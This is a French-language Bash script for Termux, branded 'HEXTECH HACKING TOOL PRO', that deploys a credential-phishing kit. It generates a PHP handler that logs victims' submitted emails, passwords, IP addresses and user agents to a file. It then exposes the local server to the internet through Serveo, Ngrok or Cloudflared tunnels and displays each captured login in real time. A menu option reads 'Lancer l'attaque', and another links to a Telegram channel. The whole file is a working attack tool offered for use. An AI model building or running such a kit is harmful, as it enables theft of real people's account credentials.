#!/bin/bash

# Couleurs améliorées avec effets
BLEU='\033[1;34m\033[1;5m'
JAUNE='\033[1;33m\033[1;4m'
ROUGE='\033[1;31m\033[1;3m'
VERT='\033[1;32m\033[1;2m'
CYAN='\033[1;36m\033[1;1m'
MAGENTA='\033[1;35m\033[1;6m'
NC='\033[0m' # Pas de couleur

# Animation ASCII
animation() {
    clear
    echo -e "${MAGENTA}"
    echo -e " ██╗  ██╗███████╗██╗  ██╗████████╗███████╗ ██████╗██╗  ██╗"
    echo -e " ██║  ██║██╔════╝╚██╗██╔╝╚══██╔══╝██╔════╝██╔════╝██║  ██║"
    echo -e " ███████║█████╗   ╚███╔╝    ██║   █████╗  ██║     ███████║"
    echo -e " ██╔══██║██╔══╝   ██╔██╗    ██║   ██╔══╝  ██║     ██╔══██║"
    echo -e " ██║  ██║███████╗██╔╝ ██╗   ██║   ███████╗╚██████╗██║  ██║"
    echo -e " ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝╚═╝  ╚═╝"
    echo -e "${NC}"
    echo -e "${CYAN}==================================================${NC}"
    echo -e "${VERT}          🇨🇩 HACKING TOOL PRO 🇨🇩         ${NC}"
    echo -e "${CYAN}==================================================${NC}"
    echo -e "${JAUNE}           🔥 ${ROUGE}HEXTECH${JAUNE}  - POWERED BY ${ROUGE}HEXTECH${JAUNE} 🔥${NC}"
    echo -e "${CYAN}==================================================${NC}"
    sleep 1
}

# Fonction simplifiée pour afficher seulement email et password
afficher_donnees() {
    echo -e "\n${CYAN}═════════ CONNEXION DÉTECTÉE ═════════${NC}"
    while IFS= read -r ligne || [[ -n "$ligne" ]]; do
        ligne_clean=$(echo "$ligne" | tr -d '\r')
        case "$ligne_clean" in
            *Email:*|*email:*|*Username:*)
                echo -e "${VERT}✉️ Email: ${NC}${ligne_clean#*: }"
                ;;
            *password:*|*Password:*|*[Mm]ot\ de\ passe:*)
                echo -e "${VERT}🔑 Mot de passe: ${NC}${ligne_clean#*: }"
                ;;
        esac
    done < login.txt
    echo -e "${CYAN}══════════════════════════════════════${NC}"
    echo -e "${ROUGE}🚨 nano login.txt pour voir tous les détails 🚨${NC}\n"
}

# Surveillance des données en temps réel
surveiller_donnees() {
    echo -e "${VERT}[•] Surveillance des connexions en temps réel...${NC}"
    echo -e "${JAUNE}Appuyez sur ${ROUGE}Ctrl+C${JAUNE} pour arrêter${NC}"

    if [ ! -f login.txt ]; then
        touch login.txt
        chmod 644 login.txt
    fi

    if [ -s login.txt ]; then
        echo -e "${JAUNE}📊 Données existantes :${NC}"
        afficher_donnees
    else
        echo -e "${JAUNE}🔗 En attente de premières connexions...${NC}"
    fi

    tail -n 0 -f login.txt | while read -r ligne; do
        if [[ "$ligne" == *"Email:"* || "$ligne" == *"Password:"* ]]; then
            clear
            animation
            echo -e "${VERT}[✓] NOUVELLE CONNEXION !${NC}"
            afficher_donnees
            echo -e "${JAUNE}🕵️ En attente d'autres connexions...${NC}"
        fi
    done
}

# Démarrer le serveur PHP avec le script intégré
demarrer_serveur_php() {
    echo -e "${BLEU}[•] Démarrage du serveur PHP...${NC}"
    
    # Créer le fichier PHP s'il n'existe pas
    if [ ! -f login.php ]; then
        cat > login.php << 'EOL'
<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'] ?? '';
    $password = $_POST['password'] ?? '';
    $ip = $_SERVER['REMOTE_ADDR'];
    $date = date('Y-m-d H:i:s');

    if (empty($email) || empty($password)) {
        die(json_encode(['error' => 'Email et mot de passe requis']));
    }

    $logEntry = "=== CONNEXION ===\n";
    $logEntry .= "Date: $date\n";
    $logEntry .= "Email: ".htmlspecialchars($email)."\n";
    $logEntry .= "Password: ".htmlspecialchars($password)."\n";
    $logEntry .= "IP: $ip\n";
    $logEntry .= "User Agent: ".$_SERVER['HTTP_USER_AGENT']."\n";
    $logEntry .= "========================\n\n";

    $logFile = __DIR__.'/login.txt';
    
    try {
        if (!file_exists($logFile)) {
            file_put_contents($logFile, '');
            chmod($logFile, 0644);
        }

        if (file_put_contents($logFile, $logEntry, FILE_APPEND | LOCK_EX) === false) {
            throw new Exception("Échec écriture fichier");
        }

        header("Location: mer.html");
        exit();

    } catch (Exception $e) {
        error_log("Erreur: ".$e->getMessage());
        header("HTTP/1.1 500 Erreur serveur");
        die("Erreur temporaire");
    }
} else {
    header("HTTP/1.1 403 Forbidden");
    die("Accès non autorisé");
}
EOL
        echo -e "${VERT}[✓] Fichier login.php créé${NC}"
    fi

    php -S localhost:8080 > /dev/null 2>&1 &
    sleep 2
    echo -e "${VERT}[✓] Serveur PHP actif sur port 8080${NC}"
    surveiller_donnees
}

# Installer Ngrok
installer_ngrok() {
    echo -e "${JAUNE}[•] Téléchargement de Ngrok...${NC}"
    
    # Animation
    while :; do
        for i in / - \\ \|; do
            printf "\r${CYAN}Téléchargement... $i ${NC}"
            sleep 0.1
        done
    done & ANIM_PID=$!

    if wget -q -O ngrok.zip "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm64.zip"; then
        kill $ANIM_PID
        echo -e "\r${VERT}[✓] Ngrok téléchargé            ${NC}"
    else
        kill $ANIM_PID
        echo -e "\r${ROUGE}[!] Échec téléchargement${NC}"
        exit 1
    fi

    echo -e "${BLEU}[•] Installation...${NC}"
    if unzip -q ngrok.zip; then
        mkdir -p ~/bin/
        mv ngrok ~/bin/ && chmod +x ~/bin/ngrok
        rm ngrok.zip
        export PATH=$PATH:~/bin/
        echo -e "${VERT}[✓] Ngrok installé dans ~/bin/${NC}"
    else
        echo -e "${ROUGE}[!] Échec installation${NC}"
        rm ngrok.zip
        exit 1
    fi
}

# Générer lien Ngrok
generer_lien_ngrok() {
    if ! command -v ngrok &> /dev/null; then
        installer_ngrok
    fi
    
    echo -e "${JAUNE}[•] Lancement de Ngrok...${NC}"
    echo -e "${CYAN}==================================================${NC}"
    ~/bin/ngrok http 8080 || {
        echo -e "${ROUGE}[!] Erreur Ngrok${NC}"
        exit 1
    }
}

# Générer lien Serveo
generer_lien_serveo() {
    echo -e "${JAUNE}[•] Connexion à Serveo...${NC}"
    echo -e "${CYAN}==================================================${NC}"
    ssh -R 80:localhost:8080 serveo.net || {
        echo -e "${ROUGE}[!] Échec Serveo${NC}"
    }
}

# Générer lien Cloudflared
generer_lien_cloudflared() {
    echo -e "${JAUNE}[•] Démarrage avec Cloudflared...${NC}"
    if ! command -v cloudflared &> /dev/null; then
        echo -e "${ROUGE}[!] Cloudflared n'est pas installé. Installation...${NC}"
        pkg install cloudflared -y || {
            echo -e "${ROUGE}[!] Échec installation Cloudflared${NC}"
            exit 1
        }
    fi
    echo -e "${CYAN}==================================================${NC}"
    cloudflared tunnel --url http://localhost:8080 || {
        echo -e "${ROUGE}[!] Erreur Cloudflared${NC}"
        exit 1
    }
}

# Vérifier les dépendances
verifier_dependances() {
    echo -e "${CYAN}[•] Vérification des outils...${NC}"
    
    declare -A outils=(
        ["php"]="pkg install php -y"
        ["ssh"]="pkg install openssh -y"
        ["unzip"]="pkg install unzip -y"
    )
    
    for outil in "${!outils[@]}"; do
        if ! command -v $outil &> /dev/null; then
            echo -e "${ROUGE}[!] $outil manquant. Installation...${NC}"
            eval "${outils[$outil]}" || {
                echo -e "${ROUGE}[!] Échec installation $outil${NC}"
                exit 1
            }
        fi
    done
    
    echo -e "${VERT}[✓] Tous les outils sont prêts${NC}"
}

# Menu principal
menu_principal() {
    while true; do
        animation
        echo -e "${VERT}1. ${BLEU}Lancer l'attaque${NC}"
        echo -e "${VERT}2. ${JAUNE}Notre Telegram${NC}"
        echo -e "${VERT}3. ${ROUGE}Quitter${NC}"
        echo -e "${CYAN}==================================================${NC}"
        read -p "Choix (1-3) : " choix

        case $choix in
            1)
                echo -e "${CYAN}Méthode de tunneling :${NC}"
                echo -e "${VERT}1. ${BLEU}Serveo (SSH)${NC}"
                echo -e "${VERT}2. ${JAUNE}Ngrok${NC}"
                echo -e "${VERT}3. ${MAGENTA}Cloudflared${NC}"
                read -p "Votre choix (1-3) : " methode

                verifier_dependances
                demarrer_serveur_php &

                case $methode in
                    1) generer_lien_serveo ;;
                    2) generer_lien_ngrok ;;
                    3) generer_lien_cloudflared ;;
                    *) echo -e "${ROUGE}Option invalide${NC}"; continue ;;
                esac
                ;;
            2)
                echo -e "${BLEU}Ouverture Telegram...${NC}"
                termux-open-url "https://t.me/hextechcar"
                ;;
            3)
                echo -e "${ROUGE}À bientôt!${NC}"
                exit 0
                ;;
            *)
                echo -e "${ROUGE}Choix invalide${NC}"
                sleep 1
                ;;
        esac
    done
}

# Point d'entrée
clear
menu_principal
